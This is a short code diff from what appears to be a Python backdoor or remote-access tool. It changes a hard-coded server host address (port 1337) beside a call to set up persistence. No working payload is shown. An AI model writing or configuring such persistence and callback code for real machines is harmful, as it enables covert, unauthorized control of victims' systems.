@@ -420,7 +420,7 @@ if os.path.dirname(os.path.realpath(__file__)).lower() != get_program_folder().l
     setup_persistence()
 
 #########################
-SERVER_HOST = "10.0.22.16"
+SERVER_HOST = "10.99.99.16"
 SERVER_PORT = 1337
 #########################
 
